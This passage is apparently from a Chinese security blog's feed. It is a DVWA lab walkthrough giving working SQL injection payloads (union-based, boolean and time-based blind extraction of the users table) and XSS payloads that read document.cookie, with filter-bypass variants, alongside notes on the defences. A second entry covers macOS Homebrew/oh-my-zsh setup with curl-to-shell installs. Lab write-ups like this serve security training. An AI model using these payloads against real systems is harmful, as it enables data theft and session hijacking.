id="7-2-安全等级：MEDIUM"><a href="#7-2-安全等级：MEDIUM" class="headerlink" title="7.2. 安全等级：MEDIUM"></a>7.2. 安全等级：MEDIUM</h2><h3 id="7-2-1-思路1："><a href="#7-2-1-思路1：" class="headerlink" title="7.2.1. 思路1："></a>7.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级仅仅添加了一个判断是否通过验证码打的参数passed_captcha，只需要拦截请求包添加passed_captcha参数和更改step参数为2。截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.037.png"></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.038.png"></p><h2 id="7-3-安全等级：HIGH"><a href="#7-3-安全等级：HIGH" class="headerlink" title="7.3. 安全等级：HIGH"></a>7.3. 安全等级：HIGH</h2><h3 id="7-3-1-思路1："><a href="#7-3-1-思路1：" class="headerlink" title="7.3.1. 思路1："></a>7.3.1. 思路1：</h3><p>不再采用分步重置密码，当即校验验证码是否正确，但是判断变量可以从从伪造参数g-recaptcha-response和user-agent绕过验证，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.039.png"></p><h2 id="7-4-安全等级：impossible"><a href="#7-4-安全等级：impossible" class="headerlink" title="7.4. 安全等级：impossible"></a>7.4. 安全等级：impossible</h2><p>本级别将验证码验证放在同一个步骤中，验证机制没有例外，数据库操作参数使用pdo执行，更改密码前需要输入原密码。无法绕过验证码。</p><h1 id="8-SQL-Injection-SQL注入"><a href="#8-SQL-Injection-SQL注入" class="headerlink" title="8. SQL Injection (SQL注入)"></a>8. SQL Injection (SQL注入)</h1><h2 id="8-1-安全等级：LOW"><a href="#8-1-安全等级：LOW" class="headerlink" title="8.1. 安全等级：LOW"></a>8.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.040.png"></p><h3 id="8-1-1-思路1："><a href="#8-1-1-思路1：" class="headerlink" title="8.1.1. 思路1："></a>8.1.1. 思路1：</h3><ol><li> 判断是否存在注入，注入是字符型还是数字型</li></ol><p>a) 使用1’测试报错显示是字符型</p><ol start="2"><li> 猜解SQL查询语句中的字段数</li></ol><p>a) 使用1’ order by n—判断出列数为2</p><ol start="3"><li> 确定显示的字段顺序</li></ol><p>a) 使用union select 1,2 – 判断能显示的字段</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.041.png"></p><ol start="4"><li> 获取当前数据库</li></ol><p>a) 使用1’ union select @@version,database()—</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.042.png"></p><ol start="5"><li> 获取数据库中的表</li></ol><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.043.png"></p><ol start="6"><li> 获取表中的字段名</li></ol><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.044.png"></p><ol start="7"><li> 下载数据</li></ol><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.045.png"></p><h2 id="8-2-安全等级：MEDIUM"><a href="#8-2-安全等级：MEDIUM" class="headerlink" title="8.2. 安全等级：MEDIUM"></a>8.2. 安全等级：MEDIUM</h2><h3 id="8-2-1-思路1："><a href="#8-2-1-思路1：" class="headerlink" title="8.2.1. 思路1："></a>8.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级将前端输入变成选择id，使用burp即可无视前端防护，后台代码使用了mysqli_real_escape_string函数，但是这里是数字型，并不能防护。截图如下：</p><ol><li> 判断是否存在注入，注入是字符型还是数字型</li></ol><p>a) 使用1 or 1=1测试报错显示是数字型</p><ol start="2"><li> 猜解SQL查询语句中的字段数</li></ol><p>a) 使用1 order by n—判断出列数为2</p><ol start="3"><li> 确定显示的字段顺序</li></ol><p>a) 使用union select 1,2 – 判断能显示的字段</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.046.png"></p><ol start="4"><li> 获取当前数据库</li></ol><p>a) 使用1 union select @@version,database()</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.047.png"></p><ol start="5"><li> 获取数据库中的表</li></ol><p>a) 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.048.png"></p><ol start="6"><li> 获取表中的字段名</li></ol><p>a) 1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.049.png"></p><ol start="7"><li> 下载数据</li></ol><p>a) 1 union select group_concat(user),group_concat(password) from users</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.050.png"></p><h2 id="8-3-安全等级：HIGH"><a href="#8-3-安全等级：HIGH" class="headerlink" title="8.3. 安全等级：HIGH"></a>8.3. 安全等级：HIGH</h2><h3 id="8-3-1-思路1："><a href="#8-3-1-思路1：" class="headerlink" title="8.3.1. 思路1："></a>8.3.1. 思路1：</h3><p>新的界面形同虚设，后台的limit 1 注释即可，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.051.png"></p><h2 id="8-4-安全等级：impossible"><a href="#8-4-安全等级：impossible" class="headerlink" title="8.4. 安全等级：impossible"></a>8.4. 安全等级：impossible</h2><p>参数使用pdo绑定查询，且加入csrf防御，并判断结果是否为1，防止脱裤。</p><h1 id="9-SQL-Injection-Blind-SQL盲注"><a href="#9-SQL-Injection-Blind-SQL盲注" class="headerlink" title="9. SQL Injection (Blind)(SQL盲注)"></a>9. SQL Injection (Blind)(SQL盲注)</h1><h2 id="9-1-安全等级：LOW"><a href="#9-1-安全等级：LOW" class="headerlink" title="9.1. 安全等级：LOW"></a>9.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.052.png"></p><h3 id="9-1-1-思路1："><a href="#9-1-1-思路1：" class="headerlink" title="9.1.1. 思路1："></a>9.1.1. 思路1：</h3><p>使用基于bool的注入</p><ol><li> 判断是否存在注入，注入是字符型还是数字型</li></ol><p>a) 使用1’and’1’=’1返回正确结果</p><p>b) 使用1’and’1’=’2 返回错误结果</p><p>c) 判断为字符型注入</p><ol start="2"><li> 获取当前数据库</li></ol><p>a) 使用1’ and length(database())&gt;n— 判断出当前数据库名长度为4</p><p>b) 使用1’ and ascii(substr(database(),1,1))=n-- 可以判断出第一位为d（或者使用二分法查询）</p><p>c) 依次判断出当前数据库名。dvwa</p><ol start="3"><li> 获取数据库中的表</li></ol><p>a) 首先使用1’ and (select count(table_name) from information_schema.tables where table_schema=database())=n-- 判断出有两个数据表</p><p>b) 然后判断第一个数据表名的长度，使用1’ and (SELECT (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1))=n—</p><p>c) 判断第一个数据表表名：1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=n --</p><p>d) 按这个方法，可以猜测出两个数据表 guestbook, users</p><ol start="4"><li> 获取表中的字段名</li></ol><p>a) 首先使用1’ and (select count(column_name) from information_schema.columns where table_name=’users’ and TABLE_SCHEMA = ‘dvwa’)=n-- 判断出有8个字段</p><p>b) 然后判断第一个字段名的长度，使用1’ and (SELECT (select length(column_name) from information_schema.columns where table_schema=’dvwa’ and table_name=’users’ limit 1,1))=n—</p><p>c) 判断第一个数据表表名：1’ and ascii(substr((select column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’ limit 1,1),1,1))=n –</p><p>d) 按这个方法，可以猜测出列名。</p><ol start="5"><li> 下载数据</li></ol><p>a) 判断数据表行数:1’ and (select count(*) from users)=n--</p><p>b) 判断user列第一行数据长度：1’ and (select(select length(user) from users limit 1,1))=n--</p><p>c) 判断user字段第一个数据: 1’ and ascii(substr((select user from users limit 1,1),1,1))=n –</p><p>d) 如此可以获取任何数据</p><h3 id="9-1-2-思路2"><a href="#9-1-2-思路2" class="headerlink" title="9.1.2. 思路2:"></a>9.1.2. 思路2:</h3><p>使用基于时间的注入，使用if(条件,seleep(4),1)</p><ol><li> 判断是否存在注入，注入是字符型还是数字型</li></ol><p>a) 使用1’and sleep(5) – 感到延迟</p><p>b) 使用1 and sleep(5)– 没有延迟</p><p>c) 判断为字符型注入</p><ol start="2"><li> 获取当前数据库</li></ol><p>a) 使用1’ and if(length(database())&gt;n,sleep(3),1)— 判断出当前数据库名长度为4</p><p>b) 使用1’ and if(ascii(substr(database(),1,1))=n,sleep(3),1)-- 可以判断出第一位为d（或者使用二分法查询）</p><p>c) 依次判断出当前数据库名。dvwa</p><ol start="3"><li> 获取数据库中的表</li></ol><p>a) 首先使用1’ and if((select count(table_name) from information_schema.tables where table_schema=database())=n,sleep(3),1)-- 判断出有两个数据表</p><p>b) 然后判断第一个数据表名的长度，使用1’ and if((SELECT (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1))=n,sleep(3),1)—</p><p>c) 判断第一个数据表表名：1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=n,sleep(3),1) –</p><p>d) 按这个方法，可以猜测出两个数据表 guestbook, users</p><ol start="4"><li> 获取表中的字段名</li></ol><p>a) 首先使用1’ and if((select count(column_name) from information_schema.columns where table_name=’users’ and TABLE_SCHEMA = ‘dvwa’)=n,sleep(3),1)-- 判断出有8个字段</p><p>b) 然后判断第一个字段名的长度，使用1’ and if((SELECT (select length(column_name) from information_schema.columns where table_schema=’dvwa’ and table_name=’users’ limit 1,1))=n,sleep(3),1)—</p><p>c) 判断第一个数据表表名：1’ and if(ascii(substr((select column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’ limit 1,1),1,1))=n,sleep(3),1) –</p><p>d) 按这个方法，可以猜测出列名。</p><ol start="5"><li> 下载数据</li></ol><p>a) 判断数据表行数:1’ and if((select count(*) from users)=n,sleep(3),1)--</p><p>b) 判断user列第一行数据长度：1’ and if((select(select length(user) from users limit 1,1))=n,sleep(3),1)--</p><p>c) 判断user字段第一个数据: 1’ and if(ascii(substr((select user from users limit 1,1),1,1))=n,sleep(3),1) –</p><p>d) 如此可以获取任何数据</p><h2 id="9-2-安全等级：MEDIUM"><a href="#9-2-安全等级：MEDIUM" class="headerlink" title="9.2. 安全等级：MEDIUM"></a>9.2. 安全等级：MEDIUM</h2><h3 id="9-2-1-思路1："><a href="#9-2-1-思路1：" class="headerlink" title="9.2.1. 思路1："></a>9.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级将前端输入变成选择id，使用burp即可无视前端防护，后台代码使用了mysqli_real_escape_string函数，但是这里是数字型，并不能防护。基于bool和基于时间的方法利用payload与low等级相同，只需在burp中拦截并修改即可。</p><h2 id="9-3-安全等级：HIGH"><a href="#9-3-安全等级：HIGH" class="headerlink" title="9.3. 安全等级：HIGH"></a>9.3. 安全等级：HIGH</h2><h3 id="9-3-1-思路1："><a href="#9-3-1-思路1：" class="headerlink" title="9.3.1. 思路1："></a>9.3.1. 思路1：</h3><p>使用cookie传参数，校验错误的时候随机产生时间延迟，Limit 1仍然可以被直接注释掉。因此这里仍然可以使用基于bool的盲注。过程省略：</p><h2 id="9-4-安全等级：impossible"><a href="#9-4-安全等级：impossible" class="headerlink" title="9.4. 安全等级：impossible"></a>9.4. 安全等级：impossible</h2><p>参数使用pdo绑定查询，且加入csrf防御，并判断结果是否为1，防止脱裤。</p><h1 id="10-Weak-Session-IDs-弱session口令"><a href="#10-Weak-Session-IDs-弱session口令" class="headerlink" title="10. Weak Session IDs (弱session口令)"></a>10. Weak Session IDs (弱session口令)</h1><h2 id="10-1-安全等级：LOW"><a href="#10-1-安全等级：LOW" class="headerlink" title="10.1. 安全等级：LOW"></a>10.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.053.png"></p><h3 id="10-1-1-思路1："><a href="#10-1-1-思路1：" class="headerlink" title="10.1.1. 思路1："></a>10.1.1. 思路1：</h3><p>很容易看出dvwaSession是递增产生的，所以攻击者只需要从0开始向上尝试，即可伪造session口令。截图如下（这里好像并没作用，只是个代码审计）；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.054.png"></p><h2 id="10-2-安全等级：MEDIUM"><a href="#10-2-安全等级：MEDIUM" class="headerlink" title="10.2. 安全等级：MEDIUM"></a>10.2. 安全等级：MEDIUM</h2><h3 id="10-2-1-思路1："><a href="#10-2-1-思路1：" class="headerlink" title="10.2.1. 思路1："></a>10.2.1. 思路1：</h3><p>Session机制采用基于时间戳生成，只要知道用户A登录大致时间，就可以推测出A的session，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.055.png"></p><h2 id="10-3-安全等级：HIGH"><a href="#10-3-安全等级：HIGH" class="headerlink" title="10.3. 安全等级：HIGH"></a>10.3. 安全等级：HIGH</h2><h3 id="10-3-1-思路1："><a href="#10-3-1-思路1：" class="headerlink" title="10.3.1. 思路1："></a>10.3.1. 思路1：</h3><p>仍然采用累加的方式，只不过就行了进一步的md5操作，基于大量的session值可以分析出来，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.056.png"></p><h2 id="10-4-安全等级：impossible"><a href="#10-4-安全等级：impossible" class="headerlink" title="10.4. 安全等级：impossible"></a>10.4. 安全等级：impossible</h2><p>使用随机数+时间戳+固定字符串进行md5生成作为session，很难被猜测到。</p><h1 id="11-XSS-DOM-基于dom的xss攻击"><a href="#11-XSS-DOM-基于dom的xss攻击" class="headerlink" title="11. XSS DOM (基于dom的xss攻击)"></a>11. XSS DOM (基于dom的xss攻击)</h1><h2 id="11-1-安全等级：LOW"><a href="#11-1-安全等级：LOW" class="headerlink" title="11.1. 安全等级：LOW"></a>11.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.057.png"></p><h3 id="11-1-1-思路1："><a href="#11-1-1-思路1：" class="headerlink" title="11.1.1. 思路1："></a>11.1.1. 思路1：</h3><p>抓包分析一下，传入default参数，前端代码设置为动态生成选项值，且没有任何防护，截图如下；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.058.png"></p><p>故可以直接利用payload : </p><pre class="language-none"><code class="language-none">default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.059.png"></p><h2 id="11-2-安全等级：MEDIUM"><a href="#11-2-安全等级：MEDIUM" class="headerlink" title="11.2. 安全等级：MEDIUM"></a>11.2. 安全等级：MEDIUM</h2><h3 id="11-2-1-思路1："><a href="#11-2-1-思路1：" class="headerlink" title="11.2.1. 思路1："></a>11.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级对&lt;script进行了检测，如果含有该字符串，default参数就会被重置。服务端检测的参数和前端取用的值不对应，成功绕过检测， payload：</p><pre class="language-none"><code class="language-none">?default=2342&amp;default2=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p>截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.060.png"></p><h2 id="11-3-安全等级：HIGH"><a href="#11-3-安全等级：HIGH" class="headerlink" title="11.3. 安全等级：HIGH"></a>11.3. 安全等级：HIGH</h2><h3 id="11-3-1-思路1："><a href="#11-3-1-思路1：" class="headerlink" title="11.3.1. 思路1："></a>11.3.1. 思路1：</h3><p>可用medium中的payload方法绕过，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.061.png"></p><h2 id="11-4-安全等级：impossible"><a href="#11-4-安全等级：impossible" class="headerlink" title="11.4. 安全等级：impossible"></a>11.4. 安全等级：impossible</h2><p>由前端防护</p><h1 id="12-XSS-Reflected-基于反射型的xss攻击"><a href="#12-XSS-Reflected-基于反射型的xss攻击" class="headerlink" title="12. XSS Reflected (基于反射型的xss攻击)"></a>12. XSS Reflected (基于反射型的xss攻击)</h1><h2 id="12-1-安全等级：LOW"><a href="#12-1-安全等级：LOW" class="headerlink" title="12.1. 安全等级：LOW"></a>12.1. <code>安全等级</code>：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.062.png"></p><h3 id="12-1-1-思路1："><a href="#12-1-1-思路1：" class="headerlink" title="12.1.1. 思路1："></a>12.1.1. 思路1：</h3><p>抓包分析一下，传入name参数，后台直接接受并返回；</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.063.png"></p><p>故可以直接利用payload : </p><pre class="language-none"><code class="language-none">?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.064.png"></p><h2 id="12-2-安全等级：MEDIUM"><a href="#12-2-安全等级：MEDIUM" class="headerlink" title="12.2. 安全等级：MEDIUM"></a>12.2. 安全等级：MEDIUM</h2><h3 id="12-2-1-思路1："><a href="#12-2-1-思路1：" class="headerlink" title="12.2.1. 思路1："></a>12.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级对&lt;script&gt;进行了过滤，可以使用双写绕过payload：</p><pre class="language-none"><code class="language-none">?name=&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/ script&gt;)</code></pre><p>截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.065.png"></p><h3 id="12-2-2-思路2："><a href="#12-2-2-思路2：" class="headerlink" title="12.2.2. 思路2："></a>12.2.2. 思路2：</h3><p>使用dom型运行js脚本， payload：</p><pre class="language-none"><code class="language-none">&lt;img src=x onerror=javascript:alert(document.cookie)&gt;截图如下：</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.066.png"></p><h3 id="12-2-3-思路3："><a href="#12-2-3-思路3：" class="headerlink" title="12.2.3. 思路3："></a>12.2.3. 思路3：</h3><p>大小写变换绕过， payload：</p><pre class="language-none"><code class="language-none">&lt;ScripT&gt;alert()&lt;/script&gt;</code></pre><p>截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.067.png"></p><h2 id="12-3-安全等级：HIGH"><a href="#12-3-安全等级：HIGH" class="headerlink" title="12.3. 安全等级：HIGH"></a>12.3. 安全等级：HIGH</h2><h3 id="12-3-1-思路1："><a href="#12-3-1-思路1：" class="headerlink" title="12.3.1. 思路1："></a>12.3.1. 思路1：</h3><p>匹配规则无法使用双写绕过，无法使用大小写绕过，但仍然可以使用<code>&lt;img src=x&nbsp; onerror=alert(document.cookie)\&gt;</code>绕过，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.068.png"></p><h2 id="12-4-安全等级：impossible"><a href="#12-4-安全等级：impossible" class="headerlink" title="12.4. 安全等级：impossible"></a>12.4. 安全等级：impossible</h2><p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。</p><h1 id="13-XSS-Stored-基于存储型的xss攻击"><a href="#13-XSS-Stored-基于存储型的xss攻击" class="headerlink" title="13. XSS Stored(基于存储型的xss攻击)"></a>13. XSS Stored(基于存储型的xss攻击)</h1><h2 id="13-1-安全等级：LOW"><a href="#13-1-安全等级：LOW" class="headerlink" title="13.1. 安全等级：LOW"></a>13.1. 安全等级：LOW</h2><p>功能演示：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.069.png"></p><h3 id="13-1-1-思路1："><a href="#13-1-1-思路1：" class="headerlink" title="13.1.1. 思路1："></a>13.1.1. 思路1：</h3><p>抓包分析一下，使用POST方法提交name和message的值，后台进行去除转义反斜杠、特殊字符和两端空格，并未对xss防御；故可以直接利用</p><p>payload : <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.070.png"></p><h2 id="13-2-安全等级：MEDIUM"><a href="#13-2-安全等级：MEDIUM" class="headerlink" title="13.2. 安全等级：MEDIUM"></a>13.2. 安全等级：MEDIUM</h2><h3 id="13-2-1-思路1："><a href="#13-2-1-思路1：" class="headerlink" title="13.2.1. 思路1："></a>13.2.1. 思路1：</h3><p>相比LOW等级，MEDIUM等级对message进行了严格的过滤转义，但是对name参数只对&lt;script&gt;进行了过滤，可以使用双写绕过，对name长度的限制可以在burpsuit中绕过。</p><p>payload： <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/ script&gt;)</code></p><p>截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.071.png"></p><h3 id="13-2-2-思路2："><a href="#13-2-2-思路2：" class="headerlink" title="13.2.2. 思路2："></a>13.2.2. 思路2：</h3><p>使用dom型运行js脚本， payload：</p><pre class="language-none"><code class="language-none">&lt;img src=x onerror=javascript:alert(document.cookie)&gt;</code></pre><p>截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.072.png"></p><h3 id="13-2-3-思路3："><a href="#13-2-3-思路3：" class="headerlink" title="13.2.3. 思路3："></a>13.2.3. 思路3：</h3><p>大小写变换绕过， payload：<code>&lt;ScripT&gt;alert()&lt;/script&gt;</code></p><p>截图如下：<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.073.png"></p><h2 id="13-3-安全等级：HIGH"><a href="#13-3-安全等级：HIGH" class="headerlink" title="13.3. 安全等级：HIGH"></a>13.3. 安全等级：HIGH</h2><h3 id="13-3-1-思路1："><a href="#13-3-1-思路1：" class="headerlink" title="13.3.1. 思路1："></a>13.3.1. 思路1：</h3><p>Message参数仍然严格过滤，Name参数匹配规则无法使用双写绕过，无法使用大小写绕过，但name仍然可以使用<code>&lt;img src=x&nbsp; onerror=alert(document.cookie)\&gt;</code>绕过，截图如下：</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.074.png"></p><h2 id="13-4-安全等级：impossible"><a href="#13-4-安全等级：impossible" class="headerlink" title="13.4. 安全等级：impossible"></a>13.4. 安全等级：impossible</h2><p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素()该处无法利用。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
          <category> python </category>
          
          <category> SQL注入 </category>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>os x安装homebrew及oh-my-zsh</title>
      <link href="/2018/07/07/os-x-an-zhuang-homebrew-ji-oh-my-zsh/"/>
      <url>/2018/07/07/os-x-an-zhuang-homebrew-ji-oh-my-zsh/</url>
      
        <content type="html"><![CDATA[<ul><li>  安装homebrew(需要安装xcode)</li></ul><pre class="language-none"><code class="language-none">/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</code></pre><ul><li>  更新homebrew</li></ul><pre class="language-none"><code class="language-none">brew update</code></pre><ul><li>  若是提示无权限，则将/usr/local归属者给当前用户</li></ul><pre class="language-none"><code class="language-none">sudo chown -R $(whoami) /usr/local</code></pre><ul><li>  更新好以后更新zsh,并切换终端为zsh,重启终端即可</li></ul><pre class="language-none"><code class="language-none">brew install zsh&nbsp;&amp;&amp;&nbsp;chsh&nbsp;-s&nbsp;/bin/zsh</code></pre><ul><li>  安装oh-my-zsh</li></ul><pre class="language-none"><code class="language-none">sh -c"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</code></pre><ul><li>  编辑配置文件~/.zshrc即可配置主题，添加打开终端的命令等（<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/themes">主题列表</a>）</li><li>  安装自动补全插件incr，下载<a href="http://mimosa-pudica.net/src/incr-0.2.zsh%E6%94%BE%E5%85%A5~/.oh-my-zsh/custom/plugins/incr%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%E3%80%82%E5%B9%B6%E5%9C%A8~/.zhsrc%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%9C%AB%E5%B0%BE%E6%B7%BB%E5%8A%A0">http://mimosa-pudica.net/src/incr-0.2.zsh放入~/.oh-my-zsh/custom/plugins/incr文件夹中。并在~/.zhsrc配置文件末尾添加</a></li></ul><pre class="language-none"><code class="language-none">source ~/.oh-my-zsh/plugins/incr/incr*.zsh</code></pre><ul><li>  最后重启终端或执行source ~/.zshrc即可启用。</li><li>  安装语法高亮：</li></ul><pre class="language-none"><code class="language-none">#安装语法高亮插件brew install zsh-syntax-highlighting  #更改~/.zshrc,plugin中加入zsh-syntax-highlighting  ，并在文件末尾添加source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></pre><ul><li>  然后配置自带终端界面，字体设置字号13</li></ul><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2018-07-07-%E4%B8%8A%E5%8D%8811.06.35.png"><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2018-07-07-%E4%B8%8A%E5%8D%8811.06.47.png"></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
          <category> OS X </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> OS X </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手工sql注入测试</title>
      <link href="/2018/04/21/shou-gong-sql-zhu-ru-ce-shi/"/>
      <url>/2018/04/21/shou-gong-sql-zhu-ru-ce-shi/</url>
      
